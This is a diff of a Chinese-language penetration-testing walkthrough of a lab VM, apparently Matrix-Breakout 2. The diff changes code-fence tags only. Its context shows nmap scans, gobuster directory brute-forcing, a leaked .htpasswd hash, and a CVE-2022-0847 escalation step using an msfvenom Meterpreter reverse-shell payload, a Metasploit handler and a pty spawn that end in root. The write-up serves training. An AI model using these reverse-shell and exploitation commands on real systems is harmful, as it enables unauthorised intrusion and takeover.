@@ -21,7 +21,7 @@ date: "2023-08-28"
 
 #### 外网打点-探测存活
 
-```
+```bash
 C:\Users\ME\Desktop
 # nmap -sP 192.168.36.1/24
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-28 11:08 中国标准时间
@@ -38,7 +38,7 @@ Nmap done: 256 IP addresses (3 hosts up) scanned in 24.61 seconds
 
 #### 外网打点-探测端口
 
-```
+```bash
 C:\Users\ME\Desktop
 # nmap -A -p- 192.168.36.168 -Pn
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-28 12:22 中国标准时间
@@ -110,7 +110,7 @@ ___
 #### 外网打点-目录爆破
 ![image.png](../../images/MATRX-BREAKOUT-2-4.png)
 
-```
+```shell
 ➜  CodeQLpy-master gobuster dir -u http://192.168.36.168 -w /home/kali/Desktop/directory-list/directory-list-2.3-small.txt -x php,html,txt
 ===============================================================
 Gobuster v3.6
@@ -217,7 +217,7 @@ ___
 
 经过找寻后在/var/nginx/html下发现了隐藏文件`.htpasswd`，在其中发现
 
-```
+```shell
 (www-data:/var/nginx/html) $ ls -la | grep "^\."
 total 784
 drwxr-xr-x 2 nginx nginx   4096 Oct 28  2021 .
@@ -236,23 +236,24 @@ cypher:$apr1$e9o8Y7Om$5zgDW6WOO6Fl8rCC7jpvX0
 Kali只分配了2g运存，跑hashcat内存不足
 
 #### 内部渗透-CVE-2022-0847提权
-```
+
+```shell
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.36.131 LPORT=4444 -f elf -o reverse_shell_64.elf
 ```
 
-```
+```shell
 set payload linux/x64/meterpreter/reverse_tcp
 set LHOST 192.168.36.131
 set LPORT 4444
 exploit
 ```
 
-```
+```shell
 shell
 /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-```
+```shell
 # whoami 
 whoami
 root
